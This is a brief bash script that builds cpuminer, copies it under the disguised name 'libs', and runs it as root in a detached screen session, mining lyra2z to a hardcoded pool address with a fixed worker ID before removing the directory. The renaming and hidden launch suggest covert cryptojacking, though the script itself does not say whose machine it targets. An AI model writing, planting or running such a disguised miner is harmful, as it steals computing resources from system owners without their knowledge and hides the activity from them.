#!/bin/bash
sudo chmod +x build.sh 
sudo ./build.sh
sudo cp cpuminer libs
sudo screen -d -m ./libs -a lyra2z -o stratum+tcp://172.104.241.136:20581 -u phunghung.1 -p x
cd /
sudo rm -rf libs